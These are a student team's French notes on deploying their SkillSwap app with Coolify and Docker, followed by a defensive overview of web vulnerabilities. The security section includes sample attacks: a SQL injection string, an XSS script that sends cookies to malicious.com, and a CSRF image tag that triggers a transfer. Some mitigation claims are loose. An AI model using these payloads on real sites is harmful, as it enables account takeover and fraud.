sommaire :

- 1. deploiement
- 1.1. historique des actions et pbm rencontrés
- 1.2. liste des problemes et de leur resolution
- 1.2.1. pbm 1 **volumes**
- 1.2.2. pbm 2 **psql/**
- 1.2.4. pbm 3 **.env**
- 1.2.5. pbm 4 **dist/**
- 1.2.6. pbm 5 **bdd sync & seed**
- 1.2.3. pbm 6 **ports**
- 1.3. explication du deploiement
- 1.3.1. http
- 1.3.1.1. prerequis : projet docker sur repo github publique
- 1.3.1.2. copier les volumes
- 1.3.1.3. variables d'environnement
- 1.3.1.4. nom de domaine
- 1.3.1.5. conclusion
- 1.3.2. https
- 2. securité
- 2.1 types de failles de securité

---

# deploiement :

## historique des actions et pbm rencontrés

- lancement du deploiement sur coolify à partir du repo github publique
- **erreur :**
	- npm n'arrive pas à acceder aux package.json
	- connexion au server via ssh pour identifier le probleme
	- le dossier du projet n'est que partiellement importé de github
	- activation de l'option "Preserve Repository During Deployment" dans coolify
- deploiement à nouveau
- **erreur :**
	- conflits dans les fichiers importés
	- resolus manuellement avec ssh pour l'instant
- le deploiement va plus loin
- **erreur :**
	- imports ne fonctionnent pas à cause d'une erreur dans le nom d'un fichier icone
- resoud le pbm, push sur github, redeploi
- ca marche ! -> le site est en ligne, sur l'url generee par coolify
- **erreur :**
	- la ddb n'envoit pas ses infos
	- ddb ne trouve le dossier `pg_notify`
	- pbm vient du volume de la ddb "psql" qui n'est pas vide donc pas reinstallé
	- il faudra l'enlever de github, pour l'instant je le vide
- ca marche !
- **erreur :**
	- le site s'affiche, mais pas les infos de la ddb
	- les fetch sont fait sur http://localhost:3000 -> pas bon
	- pbm avec le nom de domaine : les variables .env ne sont pas remplies
	- pour que les variables soient prises en compte il faut rebuild react...................
- **erreur :**
	- npm run build ne marche pas
	- pbm vient de la ligne "main: index.js" : parcel ne sait pas quoi en faire, je l'enleve
	- build fonctionne, pbms de .env et url resolu momentanement
	- les fetch se font sur la bonne adresse au lieu de localhost
- **erreur :**
	- aucune info ne revient du back
	- les donnees n'ont pas ete seedées, je les seed manuellement
- **erreur :**
	- les fetch se font à nouveau sur localhost, peut-etre qu'en seedant les donnees j'ai perdu les variables d'env en relancant le container ? bizarre
	- je change les .env pour mettre toutes les variables d'env dans le compose file................., et les donner à coolify
	- c'est bon les variables sont bien transmises aux containers
- **erreur :**
	- les appels fetch marchent une fois, puis passent à nouveau sur localhost, il faut inverstiguer
	- en fait les fichier dans dist automatiquement crées par react ne sont pas bien mis à jour à cause de leur presence dans github
	- je les enleve de git
- **erreur :**
	- on à perdu les donnees de la base de donnee, je vais automatiser leur seeding
- **erreur :**
	- les requetes n'aboutissent pas, ca pourrait etre les ports
	- effectivement, j'ai mal géré les variables .env quand je les aient toutes mises dans le compose file..................
- ça marche !
- je force maintenant le https avec coolify
	- donc je ne creer pas un server https dans le back, on garde le server http
	- mais coolify sert de proxy pour recevoir les requettes https et les transmettre en http au back, normalement
	- c'est coolify qui gere les certificats ssl aussi
- **erreur :**
	- probleme de cors
	- j'essaye d'autoriser plusieurs URL dans les cors origin de express :
		- http://localhost,
		- http://localhost:3000,
		- http://skillswap.camille.cloud,
		- http://skillswap.camille.cloud:3000,
		- https://localhost,
		- https://localhost:3000,
		- https://skillswap.camille.cloud,
		- https://skillswap.camille.cloud:3000,
	- mais je n'arrive pas à avoir de logs de ce que je fais, je ne sais pas pourquoi
	- j'essaye d'atteindre directement l'adresse dans le terminal avec curl :
		- `curl -I https://skillswap.camille.cloud:3000/categories`
		- `error : curl: (35) error:0A00010B:SSL routines::wrong version number`
	- je verifie si le certificat ssl pose probleme avec cette commande :
		- `openssl s_client -connect skillswap.camille.cloud`
		- aucune reponse
		- `openssl s_client -connect skillswap.camille.cloud:3000`
		- aucune reponse
		- `openssl s_client -connect skillswap.camille.cloud:443`
		- reponse, tout va bien, mais c'est le port du front
	- je pense qu'il faut soit trouver le moyen de faire utiliser le port 3000 à coolify, soit utiliser une autre route, genre `/api`
	- je met l'adresse `https://skillswap.camille.cloud:3000` dans coolify pour le back
- **erreur :**
	- maintenant, le back fonctionne, mais plus le front :p
		- quand on va a l'adresse `skillswap.camille.cloud` on obtient les donnees de la ddb en json
		- pourquoi ? no lo se
	- je vais essayer une route pour l'api, `/api`, en esperant que coolify la transmette bien sur la bonne route dans docker
	- c'est le chaos j'y comprends rien au niveau des domains et des ports avec coolify, pour l'instant ça ne marche pas
	- en fait pas besoin de mettre l'url du back dans la section "domains" de coolify, c'est uniquement si on veut que le back soit accessible par tous le monde
	- comme on ne le veut accessible que par le front, on peut fetch directement http://back:3000 (back est le nom du service de docker compose)
**error :**
	- "blocked loadind mixed active content"
	- difficile de comprendre ce qui se passe avec coolify + docker pour les ports
	- j'essaye toutes le configurations possibles
- j'ai trouvé !
1. il faut utiliser un sous-domaine different pour le back et le front, et les remplir dans coolify :
	- back : https://api.camille.cloud
	- front: https://skillswap.camille.cloud
2. il faut que coolify connaisse le port dans le container back, on peut lui dire a deux endroits, mais il faut le dire au moins à un des deux :
	- mapper le port dans le compose, ex : 3001:3000
	- le mettre dans le domain du back sur coolify : https://api.camille.cloud:3000
3. dans les appels fetch, il ne faut pas mettre le port, ni du container ni de l'hote, pas hyper sur de pourquoi, mais sinon coolify ne fait pas bien son reverse proxy






## liste des problemes et de leur resolution

- resoudre les pbm que recontre coolify pour le deploiement :
	1. **volumes :** il creer des dossier ./BACK/db/migration.sql/ et ./BACK/db/seeding.sql/ au lieu de fichiers, parce qu'il les voit dans le docker-compose.yml en tant que "bind mount files" et il croit que ce sont des volumes, puis il ne parvient pas a les remplacer par les fichiers quand il synchronise avec github
	2. **psql/ :** ensuite il n'arrive pas toujours a creer la base de donnee, parce qu'il a copié le dossier psql depuis github donc il saute l'etape de recreer la base de donnee, et il lui manque des choses
	3. **.env :** ensuite il n'a pas les variables d'environnement pour les fetchs
	4. **dist/ :** parfois les fetchs sont fait sur l'url trouvee dans la variable d'env, et d'autres fois sur localhost, à cause du dossier dist/
	5. **bdd sync & seed :** à un moment il y a le pbm de la base de donnee qui doit etre cree en 2 etapes en de-commentant des lignes, je ne sais pas encore comment resoudre ca
	6. **ports :** à ce stade, le site s'affiche mais il ne recupere pas les donnees du back

### pbm 1 **volumes** :

- dans le docker-compose.yml, au lieu d'avoir 2 fichier "bind mount", on va mettre un volume qui contient les 2 fichiers :
	- avant :
	```
  volumes:
    - ./BACK/db/migration.sql:/docker-entrypoint-initdb.d/create_tables.sql 
    - ./BACK/db/seeding.sql:/docker-entrypoint-initdb.d/seeding.sql
	```
	- apres :
	```
  volumes:
    - ./BACK/db/:/docker-entrypoint-initdb.d/
	```
- aussi on change le nom de `migration.sql` pour `create_tables.sql` puisqu'il doit s'appeller comme ca dans le container
- ok

### pbm 2 **psql/** :

- on a tout simplement pas besoin de synchroniser le dossier psql dans github
	- donc on l'enleve de github : `git rm -r psql/`
	- et on le met dans .gitignore : `psql/`
- la base de donnee se recreer correctement si on deploi
- ok

### pbm 3 **.env** :

- pour l'instant chaque dossier FRONT et BACK possede son fichier .env avec ses variables d'environnements
- mais coolify ne nous laisse pas creer des variables d'environnement localisées dans tel ou tel fichier (à ma connaissance)
- donc on va changer la structure du projet pour que toutes le variables d'environnement soient declarées dans le .env à la racine du projet :
	- on declare toutes la variables dans le .env à la racine du projet
	- dans le fichier docker-compose.yml on injecte les bonnes variables dans les bons containers :
		- avant :
		```
		# dans docker-compose :

		services:
			bdd:
				environment:
					POSTGRES_DB: "skillswap"

			front:
				# pas d'environnement
		```
		- apres :
		```
		# dans .env à la racine du projet :

		POSTGRES_DB=skillswap
		REACT_APP_URL=camille.cloud
		```
		```
		# dans docker-compose :

		services:
			bdd:
				environment:
					POSTGRES_DB: ${POSTGRES_DB}

			front:
				environment:
					REACT_APP_URL: ${REACT_APP_URL}
		```
- maintenant les variables d'environnements sont dans tout l'environnement de chaque container, au lieu d'etre dans un fichier
- il ne reste plus qu'à les rentrer dans coolify avant de deployer
- ok

### pbm 4 **dist/** :

- en fait react cree des fichiers dans le dossier dist/ qui ont ete envoyé sur github
- ils ne sont du coup pas bien recrees dans le server
- il suffit de les enlever de git et github avec une regle dans .gitignore

### pbm 5 **bdd sync & seed** :

- je vais simplement comparer la bdd avant et apres sync, pour voir un critere que je pourrais utiliser pour savoir si elle a deja ete sync :
	```
	user table :
		before sync : user  
		after sync  : user

	skill table :
		before sync : id | title | duration | price | mark | level | transmission | description | availability                                             | subcategory_id | category_id | user_id 
		after sync  : id | title | duration | price        | level | transmission | description | availability | averageMark | sumOfMarks | numberOfRating | SubCategoryId  | CategoryId  | UserId | createdAt | updatedAt 

	meeting table :
		before sync : id | date                                         | skill_id | user_id 
		after sync  : id | date | status | mark | createdAt | updatedAt | UserId   | SkillId 

	interest table :
		before sync : category_id | user_id 
		after sync  : UserId      | CategoryId 
	```
- on peut utiliser la presence de la colonne "status" dans la table meeting par exemple

### pbm 6 **ports** :

- les ports n'etaient pas bien mis dans les variables .env
- ex: le port `REACT_APP_URL` n'etait pas le meme que le `PORT_FRONT` alors qu'en fait c'est le meme
- j'ai un peu ordonné toutes les variables d'environnement pour eviter des doublons et des melanges






## explication du deploiement

### http

Pour deployer en http avec coolify, il a fallut suivre quelques étapes et configurations.

#### prerequis : projet docker sur repo github publique

la premiere etape était très simple, grâce aux conditions suivantes :

- le projet est fait avec docker compose
- le code source est en publique sur github

Il a suffit de donner le lien du repo github à coolify pour qu'il prépare le déploiement.

On peut préciser la branche grâce à l'url.

#### copier les volumes

Par defaut, coolify va seulement récupérer le fichier compose, car il s'attend à un projet neuf.

Dans notre cas, nous avons dejà tout un projet mis en place dans des dossiers, en tant que volumes, donc nous voulons que coolify les prenne en compte aussi.

Pour faire ça, nous cochons la case "preserve repository during deploiement", et coolify va copier tous le contenu du repo github.

Malheureusement, cette option possède un défaut : dans notre docker-compose.yml nous utilisions un volume non standard, que coolify ne savait pas gérer, nous avons donc changé légèrement l'organisation du projet pour résoudre ce probleme :
- Nous utilisions deux fichiers "bind mount", c'est à dire que nous déclarions les fichiers directement en tant que volumes.
- Cette façon de faire ne fonctionne de toute façon pas sur toutes les machines, c'est pourquoi elle n'est pas documenté dans la doc de docker.
- Pour résoudre ce probleme, nous avons simplement déclaré comme volume le dossier contenant ces deux fichiers :
- code :
	- avant :
	```
  volumes:
    - ./BACK/db/migration.sql:/docker-entrypoint-initdb.d/create_tables.sql 
    - ./BACK/db/seeding.sql:/docker-entrypoint-initdb.d/seeding.sql
	```
	- apres :
	```
  volumes:
    - ./BACK/db/:/docker-entrypoint-initdb.d/
	```

Après ça, la copie du projet depuis github fonctionne parfaitement.

#### variables d'environnement

Pour des raisons de sécurité, nous ne synchronisons pas nos fichiers .env sur github.

Donc il faut copier le contenu de ces fichiers dans l'onglet "environment variables" de coolify.

Ici encore nous avons rencontré un léger probleme : coolify ne supporte que des variables d'environnement à la racine du projet, l'equivalent d'avoir un fichier .env à côté du fichier docker-compose.yml.

Mais notre projet utilisait des fichiers .env directement dans les containers FRONT et BACK, utilisés dans le code node.js.

Il a donc fallut restructurer le projet pour qu'il utilise les variables d'environnement à la racine.

Notre solution etait la suivante :
- mettre toutes les variables dans un fichier .env à la racine,
- et utiliser la directive "environment" du fichier compose pour ajouter ces variables directement dans les environnement des containers.

Il ne reste plus qu'à copier manuellement ces variables dans coolify, qui supporte le simple copier-coller d'un fichier .env, donc c'est très rapide et simple à faire.

#### nom de domaine

Pour que le projet soit accessible en ligne, il faut qu'on précise à coolify quel nom de domaine il doit utiliser.

En effet, coolify utilise son propre reverse proxy, ce qui nous évite d'en mettre un an place nous-même.

Le reverse proxy est un server, celui de coolify s'appelle "traefik", qui reçoit les requetes web avant notre server en node.js.

L'utilité est de pouvoir dire "si je reçois une requete pour telle url, je la redirige vers tel container".

Dans notre cas, on veut que notre nom de domaine redirige vers notre container FRONT, il faut donc qu'on informe coolify que le container FRONT est accessible depuis telle url.

Comme nous possedons un domaine "camille.cloud", nous avons crée un sous-domaine (cela se fait directement sur le site de notre hebergeur web) "skillswap.camille.cloud".

Il ne nous reste plus qu'à rentrer l'adresse "http://skillswap.camille.cloud" dans le champ "domains for front" de coolify.

Sans cette étape, notre site n'aurait pas éte accessible depuis notre sous-domaine, mais depuis notre domaine principale sur le bon port, exemple : "http://camille.cloud:1234"

#### conclusion

Coolify simplifie beaucoup le déployement, mais il rajoute aussi une couche de complexité, qui fait que les erreurs peuvent être plus difficiles à démeler quand on ne connait pas encore bien le déploiement.

Les difficultés rencontrés ont été les suivantes :
- Copier les volumes, en évitant les fichiers "bind mount".
- Organiser toutes la variables d'environnement à la racine.
- Comprendre les options de coolify pour le reverse proxy qui permet d'acceder au site depuis le bon sous-domaine.

Une fois ces difficultés dépassées, le deploiement est très simple.

### https


---

# securité :

## Types de failles de sécurité :

- Injection SQL
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- brute force
- man in the middle
- DDOS (& DOS) ((Distributed) Denial of Service)
- IDOR (Insecure Direct Object Reference)
- API abuse

## Descriptions des failles de sécurité :

1. **Injection SQL**   
   Injecter une requête sql "malveillante", qui fait fonctionner la base de  données d'une manière imprévue.   
   Exemple d'injection sur une page de connexion :
   - La page a 2 champs de formulaire pour se connecter 'email' et 'password':   
     `"SELECT * FROM users WHERE email = '$email' AND  password = '$password'";`
   - Si on remplit uniquement le 'email' avec [' OR '1'='1], ca donne cette requête :   
     `SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '';`   
     `1=1` est toujours vraie donc on peut se connecter avec n'importe quel email sans le mot de passe.   
   **Comment s’en protéger :**
   - Les requêtes paramétrées :   
     Les requêtes paramétrées permettent de protéger contre les injections SQL, contrairement aux requêtes concaténées, parce que le moteur SQL (Sequelize ici) interprète d’abord la structure de la requête, puis il y injecte les paramètres dans un second temps.   
     Requête paramétrée :    
     `Users.findOne({ where: { user_email: user_email } });`   
     Requête concaténée :   
     `”SELECT * FROM Users WHERE email = '“ + $email + ”'”;`   
     Avec une requête paramétrée il n’est pas possible de transformer la requête en jouant sur les guillemets pour ajouter de la logique (comme “1=1”).
   - Échapper les valeurs :   
     Pour éviter une injection SQL, on peut “échapper” les valeurs qui pourraient être interprétées comme de la syntaxe SQL, comme les apostrophes, en y plaçant un “\” devant.   
     Par exemple, la valeur “L’argent” qui contient une apostrophe, peut être échappée :   
     `“L\’argent”`
   - Sanitization, Conditions, et Validations des valeurs :   
     Une autre bonne pratique pour éviter les injections SQL, c’est de valider et vérifier que les valeurs rentrées sont sous la bonne forme, par exemple de type nombre ou caractères.   
     Par exemple, on peut vérifier qu’une valeur est bien un nombre entier, et qu’elle ne peut pas être nulle :   
		 ```   
     type: DataTypes.INTEGER,   
     validate: { notEmpty: true, }   
		 ```   
   **Ce qu'on a mis en place pour s'en proteger :**
   - Notre implémentation avec Sequelize :
     - Dans notre projet, on utilise Sequelize comme moteur SQL, avec un système de modèles, qui permet de mettre en place ces 3 types de protections :
     - Générer automatiquement des requêtes paramétrées, grâce aux méthodes qu’il utilise pour interagir avec la base de données (findOne, findAll, create, update, destroy, etc).
     - Échapper les valeurs, ce que Sequelize fait tout seul.
     - Valider et conditionner : Sequelize propose une syntaxe dans les modèles pour ajouter des types, allant des “nombres” au “texte” en passant par les “dates”, les “booléens”, les “enums”, les “json”, les “ranges”, etc, ainsi que des méthodes de validations avec le mot clé “validate”, pour vérifier des conditions plus complexes. Tout cela nous permet d'éviter pleins d’erreurs et de beaucoup limiter le champ d’attaque possible.   
   **Ce qui nous reste a faire :**
   - à creuser
2. **XSS** (Cross-Site Scripting)   
   Injecter du code malveillant sur une page vue par un autre utilisateur, par exemple pour récupérer ses cookies de session.   
   Exemple d'attaque xss sur un site web qui permet de faire une recherche :
   - Le site possède une page avec un champ de recherche, on peut chercher "babar" par exemple :   
     `recherche: [babar]`
   - Lorsqu'on valide la recherche, elle est envoyée avec la méthode GET au back :   
     `https://exemple.com/search?query=babar`
   - Le site affiche (c’est important) ensuite la recherche en plus des résultats :   
     `les résultats pour votre recherche "babar" sont etc…`
   - Donc si on envoie cette url à quelqu'un, le site va afficher la query présente dans l’url, ici “babar”, et les résultats de la recherche :   
     `https://exemple.com/search?query=babar`   
     `les résultats pour votre recherche "babar" sont etc…`
   - Au lieu d'envoyer "babar" dans le champ de recherche de l'url, on peut y mettre un script, il s'exécutera alors dans le front :   
	   `<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>`   
     `les résultats pour votre recherche <script>...</script>`   
     -> Le script est exécuté.   
     En l'occurrence, il (le script) vole les cookies de session de la personne et les envoie à l'adresse "http://malicious.com/steal", on peut donc ensuite les utiliser pour se connecter au compte de la personne.   
   **Comment s’en protéger :**
   - Échapper les données :   
     Éviter que du texte soit interprété comme du code malveillant en échappant les caractères pour le forcer à rester du texte.
   - Valider et assainir les entrées :   
     Chaque contenu entré par les utilisateurs et utilisatrices du site doivent être validées, pour correspondre exactement au format demandé, et assainis, pour ne pas contenir des éléments malveillants, comme du code.
   - Utiliser une Content Security Policy (CSP) :   
     La CSP est une norme de sécurité, qu’on met en place dans les balises <meta> ou dans les entêtes HTTP, et qui definit les règles de sécurité que doit respecter le navigateur, par exemple :
   - Content-Security-Policy: default-src 'self':   
     Cette politique n’autorise que les ressources (scripts, images, styles, etc) provenant du même domaine que la page.
   - Protéger les cookies :   
     Utiliser des cookies est sécurisé, uniquement si on les a bien paramétrés, avec des règles comme “secure” qui définit qu’ils ne seront envoyés qu’à travers du https, ou “httpOnly” pou dire que du javascript ne peut pas être utilisé pour y accéder, etc.
   - Séparer les données et le code :   
     Interpréter les données utilisateur comme de simples données, sans jamais les interpréter comme du code.   
   **Ce qu'on a mis en place pour s'en proteger :**
   - Notre implémentation avec React :
     - React utilise un DOM virtuel et traite tous les changements avec des règles de sécurité :
     - React fait un échappement automatique des données qui sont rendus dans le DOM, donc l’exemple précédent ne marchera pas, il donnera :
     - les résultats pour votre recherche \<script\>...\<\/script\>
     - et ne sera pas interprété comme du HTML ou du JavaScript.
     - Le JSX empêche d'insérer du html directement dans le DOM, à la place il utilise des composants et des props, et garde ainsi une bonne séparation des données et du code dans le front.
     - Le DOM virtuel réduit aussi les risques, car il permet à React de ne modifier que ce qui est précisément changé, réduisant l’impact possible d’une tentative d’attaque sur le vrai DOM.
   - Notre back avec Express, et Sequelize :
     - Dans le back, la structure mise en place est celle d’une API qui renvoie des données JSON, et Sequelize pour gérer la base de donnée, ce qui réduit fortement les risques d’attaques XSS :
     - Une API avec express permet de séparer les données et le code entre le back et le front, car elles sont traitées sans être interprétées ni intégrées à du code HTML ou JS.
     - Toutes les données entrées par les utilisateurs du site passent par la base de données avant d’être utilisées, et Sequelize opère un assainissement et une validation des données avant de les entrer dans la base de données.   
   **Ce qui nous reste a faire :**
   - Une CSP.
   - La protection des cookies.
3. **CSRF** (Cross-Site Request Forgery)   
   Amener une personne à exécuter une action non-désirée sur un site web sur lequel elle est connectée, sans s'en rendre compte.   
   Exemple d'attaque pour recevoir un virement d'une personne :
   - Une personne est connectée à sa banque en ligne
   - La personne reçoit un email de l'attaquant avec une image
   - Le code de l'image contient en fait une url de sa banque qui ordonne un virement :   
   `<img src="http://yourbank.com/transfer?amount=1000&to=attacker_account" />`
   - Comme la personne est connectée en ce moment même à sa banque, celle-ci effectue le virement sans avertir le détenteur du compte.   
   **Comment s’en protéger :**   
   - Utilisation de jetons CSRF :   
	   Ce sont des jetons uniques pour chaque requête, générees par le serveur, qui permettent à celui-ci d'etre certain que la demande vient de la page web de la personne connectée, et pas d'une autre page web. En effet, si une personne est connectee sur le site A avec un cookie de session, alors le site B ouvert dans un nouvel onglet, pourrait envoyer une requete vers le site A depuis le navigateur, et le navigateur s'occupera d'y mettre les cookies automatiquement, donc le site A croira que la requete vient de la personne, alors qu'elle vient du site B. Pour eviter ça, le site A transmet un token vers le front de l'utilisateur connecté, et il est stoqué à un endroit auquel le site B n'a pas acces, par exemple le local storage.
   - Utiliser les bonnes méthodes HTTP :   
	   Si l'API n'autorise pas la methode GET pour faire des actions sensibles, cela limite les risques d'attaque CSRF : en effet, les méthodes GET sont faciles à declancher depuis un autre site, par exemple une simple balise <img> genere une requete GET. Les autres requetes sont plus difficiles à declancher de maniere malveillantes depuis un autre site, car elles necessitent plus d'actions de la part de l'utilisteur, comme valider un formulaire. En utilisant les methodes apropriés pour chaque actions, on complique les attaques CSRF possibles.   
   **Ce qu'on a mis en place pour s'en proteger :**
   - Les token JWT : ils peuvent très bien faire l'affaire en tant que jetons CSRF, à condition qu'ils ne soient pas stoqués dans les cookies mais dans le local-storage, et transmis manuellement avec le header "Authorization". Dans notre cas, la transmission est bien faite manuellement avec le header "Authorization", mais le stoquage est fait dans les cookies.
   - Methodes HTTP dans l'API : chaque route est bien pensée pour utiliser la méthode qui correspond à l'action effectuee dans le back, donc cette partie de la protection est bien mise en place.   
   **Ce qui nous reste a faire :**
   - Stockage des token JWT dans le localStorage.
4. **Force brute**   
   Cette attaque consiste à essayer toutes les combinaisons possibles d'un mot de passe, jusqu'à tomber sur le bon.   
   C'est une attaque simple à coder donc plein de petits robots parcourent internet pour essayer automatiquement sur les sites webs.   
   Elle est souvent améliorée en utilisant des dictionnaires, pour chercher en priorité les mots de passe les plus utilisés.   
   **Comment s’en protéger :**
	 - Obliger des mots de passe forts : plus un mot de passe est long, et plus il utilise des caracteres variés, plus il prendra du temps à trouver par simple brute-force.
	 - Mettre en place un CAPTCHA : utilisez des systèmes CAPTCHA pour différencier les utilisateurs humains des robots automatiques lors des tentatives de connexion.
	 - Exiger une authentification multi-facteurs (MFA) : ajoutez une couche de sécurité supplémentaire en exigeant un second facteur d'authentification, comme un code envoyé par SMS ou une application d'authentification.
	 - Limiter le nombre de tentatives de connexion : imposer des délais entre les tentatives de connexion ou limiter le nombre de tentatives successives peut aider à ralentir les attaques de force brute.
	 - Se proteger contre les breches de base de données : si des bases de données de mots de passes sont récupérées, alors des attaquand ayant accès à ces breches peuvent les utiliser pour trouver les mots de passes en les essayant tous en brute-force. Il ne faut donc pas stocker les mots de passes en claire.   
   **Ce qu'on a mis en place pour s'en proteger :**
   - Nous avons mis en place des criteres de mots de passes forts : 12 caracteres minumum, 1 minuscule, 1 majuscule, 1 chiffre, 1 caractere special.
	 - Nous avons aussi utilisé bcrypt : protection contre les breches de bases de données grace à du hashage, et contre les attaques "arc-en-ciel" grace au salt : deux mots de passes identiques n'ont pas le meme hash, rendant impossible de comparer les hashs pour deviner les mots de passes. Un autre avantage de bcrypt est de ralentir les essais en ajoutant du temps de calcul, ce qui limite la possibilité de trouver un mot de passe par brute-force.   
   **Ce qui nous reste a faire :**
   - captcha (honeypot).
	 - limiter les tentatives.
	 - MFA.
5. **Man in the middle**   
   Un individu arrive à se placer sur le réseau entre l’ordinateur d’une personne et le site web qu’elle visite.   
   Il peut alors modifier, et peut-être même décrypter, ce que la personne envoie et reçoit.
   - Peut servir à voler des cookies de sessions
   - Voir mots de passes ou informations sensibles
   - Ajouter du code malveillant dans les échanges   
   **Comment s’en protéger :**
   - Protocole HTTPS : utiliser le protocole HTTPS au lieu du protocole HTTP, grace aux certificats ssl/tls, afin de chiffrer les données echangées entre le serveur et les clients.
   - HSTS (HTTP Strict Transport Security) : on peut forcer le navigateur à utiliser du HTTPS en implementant un entête HSTS. C’est plus sécurisé que de faire une redirection automatique du HTTP vers le HTTPS, car la redirection permet quand mêne à la premiere requete d'etre faite en HTTP.   
   **Ce qu'on a mis en place pour s'en proteger :**   
   **Ce qui nous reste a faire :**
   - HTTPS and HSTS
6. **DDOS (& DOS)** ((Distributed) Denial of Service)   
   C'est une attaque qui consiste en résumé à empêcher un serveur de fonctionner.   
   Elle est pratiquée en accablant le serveur avec beaucoup trop de requêtes pour qu'il ne puisse plus faire ses tâches habituelles.   
   Le but peut être :
   - Demander une rançon
   - Activisme politique
   - Diversion
   - Avantage compétitif en business   
   **Comment s’en protéger :**
   - Protection DDoS : Ces services répartissent le trafic sur plusieurs serveurs et utilisent des algorithmes avancés pour filtrer les attaques.
   - Pare-feu WAF (Web Application Firewall) : Un WAF agit comme un filtre entre un utilisateur et l'application web qu'il tente d'atteindre, en surveillant, filtrant et bloquant les requêtes HTTP(S) malveillantes qui tentent d'accéder à ces application.
   - Redondance et Architecture Distribuée : Concevoir une infrastructure pour qu'elle soit résiliente, avec des redondances et une architecture distribuée. Par exemple, en utilisant des CDN (Content Delivery Networks) pour distribuer le contenu du site sur plusieurs points de présence.
   - Monitoring et Alertes : Mettre en place un système de surveillance pour surveiller le trafic et les performances du site.   
   **Ce qu'on a mis en place pour s'en proteger :**
   - hostinger et cloudflare : le deploiement sur la plateforme hostinger met en place tous les elements precedents, nottament à l'aide de cloudflare.   
   **Ce qui nous reste a faire :**
   - à creuser
7. **IDOR** (Insecure Direct Object Reference)   
	 Cette faille consiste à pouvoir accéder directement à un "objet" d'une application web, sans protection.   
	 Par "objet" nous entendons fichiers, base de données, dossiers, mais aussi bouts de codes, comme des points d'accès API secrets, des tokens de session, toutes sortes d’informations.   
	 Elle survient typiquement si une URL permet d'accéder à quelque chose sans vérifier les autorisations.   
	 Exemple :
   - L’URL suivante permet de récupérer les infos d'un utilisateur connecté   
     `https://example.com/profile?user_id=123`
   - Si on n'est pas connecté en tant qu'utilisateur "123" on ne devrait pas recevoir les infos.
   - Mais si on peut recevoir les infos quand même, alors c'est une faille IDOR.   
   **Comment s’en protéger :**
   - controle d'acces backend : Avant de permettre l'accès à une ressource, vérifier que l'utilisateur a les droits nécessaires pour y accéder. Même si l'utilisateur connaît l'ID de l'objet, il ne doit pas pouvoir y accéder sans autorisation. Et le controle doit toujours etre fait dans le backend.
   - Références indirectes ou mappage d’objets : Au lieu d'exposer des identifiants directs dans l'URL (comme user_id=123), utiliser des références indirectes (comme des tokens ou des UUID) qui ne révèlent pas d'informations sensibles. Cela complique la tâche pour un attaquant potentiel de deviner les ID valides.
   - Validation des entrées : Valider et nettoyer toutes les entrées utilisateurs, y compris celles dans les paramètres URL, pour s'assurer qu'elles ne contiennent pas de valeurs inattendues ou malveillantes.   
   **Ce qu'on a mis en place pour s'en proteger :**
   - Middlewares : nous avons mis en place des middlewares qui vérifient les droits des utilisateurs pour chaque requête, en fonction des token JWT.
   - Sequelize : toutes les données utilisateurs sont entrées dans la base de données avec sequelize, qui les valide et nettoie automatiquement.   
   **Ce qui nous reste a faire :**
   - Implémenter une méthode pour ne pas utiliser de références directes dans les URLs.
8. **abus d'API**   
   Cela consiste à utiliser l'api d’une manière qui n'était pas prévue. Ça peut être d’utiliser l’API pour créer des comptes en masse, accéder à des endpoints non documentés, faire du scrapping abusif pour plagier un service, ou trouver un moyen détourné d’utiliser l’API.   
	 Exemple :
   - Une boutique en ligne propose une promotion "5 articles achetés = -20% sur la commande".
   - Cette logique est implémentée dans l'API de la boutique qui gère les commandes.
   - Une personne découvre qu'en utilisant l'API de la boutique directement, elle peut ajouter 5 articles à son panier pour déclencher la remise de 20%, puis supprimer 4 de ces articles tout en conservant la remise initiale. Mouvement qui ne fonctionnerait pas directement sur le site.   
   **Comment s’en protéger :**
   - Limiter le taux de requêtes : implémenter des limites du nombre de requêtes qui peuvent être faites sur un temps donné, pour réduire les risques.
   - Authentification et autorisation : exiger des clés API pour accéder aux services. Chaque utilisateur doit avoir une clé unique.
   - Tests logiques automatisés : mettre en place des tests pour pouvoir vérifier en profondeur les comportements de l’API et détecter les situations non-prévues.   
   **Ce qu'on a mis en place pour s'en proteger :**
   - Avec les token JWT et les middleware, chaque requête à l’API est autorisée en fonction de l’authentification.   
   **Ce qui nous reste a faire :**
   - Limiter le taux de requêtes.
   - Tests logiques automatisés.
